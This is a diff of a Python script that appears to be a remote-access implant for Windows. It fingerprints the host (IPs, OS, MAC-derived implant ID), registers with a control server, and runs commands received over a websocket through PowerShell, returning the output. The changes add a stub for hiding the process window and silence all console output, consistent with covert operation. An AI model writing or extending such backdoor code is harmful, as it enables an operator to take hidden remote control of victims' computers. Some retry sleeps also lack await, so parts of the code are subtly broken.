@@ -16,6 +16,11 @@ def def_handler(sig, frame):
 
 signal.signal(signal.SIGINT, def_handler)
 
+#def hid():
+#    if subprocess.mswindows:
+#        DETACHED_PROCESS = 0X00000008
+#        CREATE_NO_WINDOW = 0X00000000
+#        subprocess.Popen
 
 def cmo(cmd):
     result=subprocess.run(f"powershell.exe -c {cmd}", capture_output=True, text=True)
@@ -44,7 +49,6 @@ def get_local_ips():
 
 def get_public_ip():
     ip_output, err = cmo('Invoke-RestMethod -Uri "https://api.ipify.org"')
-    iplist=[]
     if ip_output:
         return ip_output
     else:
@@ -56,7 +60,13 @@ def get_operating_system():
         return sysop
     else:
         return "undefined"
+    
 
+def impl_id():
+    id=""
+    for mac in get_macs():
+        id=id+mac
+    return id.replace('-','')
 
 
 def register():
@@ -70,12 +80,10 @@ def register():
         'group': GROUP,
         'public_ip': public_ip,
         'local_ip': local_ip,
-        'operating_system': operating_system
+        'operating_system': operating_system,
+        'impl_id':impl_id()
     }
 
-    response = requests.post("http://localhost:4000/api/impl/new/1", json=model)
-    print(response.status_code)
-    print(response.text)
 
 async def recibe():
 
@@ -83,7 +91,7 @@ async def recibe():
 
     try:
 
-        uri = "ws://localhost:4000/api/rcv?id=2"
+        uri = f"ws://localhost:4000/api/rcv?id={impl_id()}"
         async with connect(uri) as ws:
 
             try:
@@ -95,28 +103,31 @@ async def recibe():
                             data = json.loads(cmd.replace("'", '"'))
                             out, err = cmo(data["cmd"])
 
-                            print(f" {data["cmd"]}")
+                            #print(f" {data["cmd"]}")
                             if out:
-                                print(f"> {out}")
+                                #print(f"> {out}")
                                 await ws.send(out)
                             else:
-                                print(f"> {err}")
+                                #print(f"> {err}")
                                 await ws.send(err)
                         
                         except json.JSONDecodeError as e:
-                            print(f"JSON inválido: {e}")
+                            asyncio.sleep(5)
+                            #print(f"JSON inválido: {e}")
                         except Exception as e:
-                            print(f"Error procesando el comando: {e}")
+                            asyncio.sleep(5)
+                            #print(f"Error procesando el comando: {e}")
 
             except ConnectionClosedError as e:
-                print(f"[!] Conexión cerrada: {e}. Reintentando en 5 segundos...")
-                await asyncio.sleep(5)
+                #print(f"[!] Conexión cerrada: {e}. Reintentando en 5 segundos...")
+                asyncio.sleep(5)
             except Exception as e:
-                print(f"[!] Error inesperado: {e}. Reintentando en 5 segundos...")
-                await asyncio.sleep(5)
+                #print(f"[!] Error inesperado: {e}. Reintentando en 5 segundos...")
+                asyncio.sleep(5)
 
 
     except Exception as e:
-        print(f": {e}")
+        asyncio.sleep(5)
+        #print(f": {e}")
 
 asyncio.run( recibe() )
